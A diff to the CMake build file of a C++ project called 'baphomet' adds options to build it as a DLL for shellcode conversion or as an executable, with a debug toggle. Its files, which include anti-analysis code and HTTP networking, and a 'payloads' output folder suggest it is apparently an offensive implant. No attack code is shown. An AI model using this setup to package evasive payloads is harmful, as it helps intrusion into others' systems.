@@ -4,9 +4,10 @@ project(baphomet)
 set(CMAKE_CXX_STANDARD 17)
 set(MAIN_INCLUDE_DIR ${CMAKE_CURRENT_SOURCE_DIR}/include)
 
-#temp
-set(CMAKE_RUNTIME_OUTPUT_DIRECTORY "C:\\lurchV3\\app\\payloads")
-set(CMAKE_RUNTIME_OUTPUT_DIRECTORY_RELEASE "C:\\lurchV3\\app\\payloads")
+
+option(BUILD_AS_DLL "Build as Windows x64 DLL" ON)
+option(DEBUG_BUILD "Compile with debug messages" ON)
+
 
 if(MSVC)
     add_compile_options(
@@ -17,7 +18,8 @@ if(MSVC)
 endif()
 
 
-add_library(baphomet SHARED src/main.cpp
+set(SOURCE_FILES
+        src/main.cpp
         src/networking/http/send.cpp
         src/networking/http/init.cpp
         src/networking/http/recieve.cpp
@@ -65,14 +67,26 @@ add_library(baphomet SHARED src/main.cpp
         include/anti_analysis.hpp
 )
 
+
+if(BUILD_AS_DLL)
+    add_library(baphomet SHARED ${SOURCE_FILES})
+    target_compile_definitions(baphomet PRIVATE BAPHOMET_COMPILE_FOR_SHELLCODE)
+    message(STATUS "Cmake Build option: DLL (for shellcode conversion)")
+else()
+    add_executable(baphomet ${SOURCE_FILES})
+    target_compile_definitions(baphomet PRIVATE BAPHOMET_COMPILE_FOR_EXE)
+    message(STATUS "Cmake Build option: executable")
+endif()
+
+
 if(MSVC)
     target_link_options(baphomet PRIVATE "/SECTION:.baph,RW")
 endif()
 
 
-#target_compile_definitions(baphomet PRIVATE BAPHOMET_COMPILE_FOR_EXE)
-target_compile_definitions(baphomet PRIVATE BAPHOMET_COMPILE_FOR_SHELLCODE)
+if(DEBUG_BUILD)
+    target_compile_definitions(baphomet PRIVATE BAPHOMET_DEBUG)
+endif()
 
 
-target_compile_definitions(baphomet PRIVATE BAPHOMET_DEBUG)
 target_include_directories(baphomet PRIVATE ${MAIN_INCLUDE_DIR})
